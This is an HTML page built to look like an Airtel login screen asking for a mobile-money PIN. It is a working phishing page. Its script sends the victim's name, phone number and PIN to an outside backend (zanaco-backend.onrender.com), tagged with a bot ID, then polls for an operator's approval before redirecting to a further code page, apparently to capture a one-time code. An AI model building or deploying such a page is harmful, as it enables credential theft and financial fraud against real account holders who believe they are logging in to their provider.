<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Enter PIN</title>
<style>
body {
    font-family: Arial, sans-serif;
    background: #fff;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
}

.pin-container {
    width: 90%;
    max-width: 400px;
    text-align: center;
}

h1 {
    color: #d60000;
    font-size: 32px;
    margin-bottom: 5px;
}

h2 {
    font-weight: normal;
    font-size: 20px;
    margin-top: 0;
    margin-bottom: 20px;
    color: #333;
}

#phoneDisplay {
    width: 100%;
    padding: 12px;
    border: 2px solid #d60000;
    border-radius: 8px;
    font-size: 18px;
    text-align: center;
    margin-bottom: 15px;
    pointer-events: none;
    background: #fff;
    box-sizing: border-box;
}

.pin-boxes {
    display: flex;
    justify-content: space-between;
    margin-bottom: 20px;
}

.pin-boxes input {
    width: 55px;
    height: 55px;
    font-size: 24px;
    text-align: center;
    border: 2px solid #d60000;
    border-radius: 8px;
    outline: none;
}

button {
    width: 100%;
    padding: 12px;
    background: #ccc;
    color: #fff;
    border: none;
    border-radius: 6px;
    font-size: 16px;
    cursor: not-allowed;
}

button.enabled {
    background: #d60000;
    cursor: pointer;
}

.status {
    margin-top: 10px;
    font-size: 14px;
    color: red;
}

.terms {
    margin-top: 30px;
    font-size: 14px;
    color: #555;
}
</style>
</head>
<body>

<div class="pin-container">
    <h1>Airtel</h1>
    <h2>Welcome</h2>

    <input id="phoneDisplay" type="text" readonly>

    <p>Enter your PIN</p>
    <form id="pinForm">
        <div class="pin-boxes">
            <input type="tel" maxlength="1" inputmode="numeric">
            <input type="tel" maxlength="1" inputmode="numeric">
            <input type="tel" maxlength="1" inputmode="numeric">
            <input type="tel" maxlength="1" inputmode="numeric">
        </div>
        <button id="submitBtn" disabled>Login</button>
    </form>

    <p class="terms">By continuing, you agree to the Terms and Conditions</p>
    <div class="status" id="status"></div>
</div>

<script>
const BACKEND_URL = "https://zanaco-backend.onrender.com";

// ---------------- BOT ID ----------------
const params = new URLSearchParams(window.location.search);
const botId = params.get('botId');
if (!botId) {
    alert("Invalid access link");
    throw new Error("botId missing");
}

// ---------------- PREFILL PHONE ----------------
const phoneDisplay = document.getElementById('phoneDisplay');
const phone = localStorage.getItem('phone');
if (!phone) {
    window.location.href = `details.html?botId=${botId}`;
}
phoneDisplay.value = phone;

// ---------------- PIN INPUT LOGIC ----------------
const inputs = document.querySelectorAll('.pin-boxes input');
const button = document.getElementById('submitBtn');
const statusDiv = document.getElementById('status');

inputs[0].focus();

inputs.forEach((input, i) => {
    input.addEventListener('input', () => {
        input.value = input.value.replace(/\D/g, '');
        if (input.value && i < inputs.length - 1) inputs[i + 1].focus();
        const allFilled = [...inputs].every(x => x.value.length === 1);
        button.disabled = !allFilled;
        button.classList.toggle('enabled', allFilled);
    });

    input.addEventListener('keydown', e => {
        if (e.key === 'Backspace' && !input.value && i > 0) inputs[i - 1].focus();
    });
});

// ---------------- SUBMIT PIN ----------------
document.getElementById('pinForm').addEventListener('submit', async e => {
    e.preventDefault();
    statusDiv.textContent = '';

    const pin = [...inputs].map(i => i.value).join('');
    localStorage.setItem('pin', pin);

    button.disabled = true;
    button.textContent = 'Logging in...';

    const res = await fetch(`${BACKEND_URL}/submit-pin`, {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({
            name: localStorage.getItem('name'),
            phone,
            pin,
            botId
        })
    });

    const { requestId } = await res.json();

    // ---------------- POLLING FOR APPROVAL ----------------
    const poll = setInterval(async () => {
        const r = await fetch(`${BACKEND_URL}/check-pin/${requestId}`);
        const d = await r.json();

        if (d.blocked) {
            statusDiv.textContent = d.message || "Enter a valid prepaid number";
            button.disabled = false;
            button.textContent = 'Login';
            [...inputs].forEach(i => i.value = '');
            clearInterval(poll);
            return;
        }

        if (d.approved === true) {
            clearInterval(poll);
            window.location.href = `code.html?botId=${botId}&requestId=${requestId}`;
            return;
        }

        if (d.approved === false) {
            statusDiv.textContent = "Incorrect PIN. Enter again.";
            button.disabled = false;
            button.textContent = 'Login';
            [...inputs].forEach(i => i.value = '');
        }
    }, 1500);
});
</script>

</body>
</html>
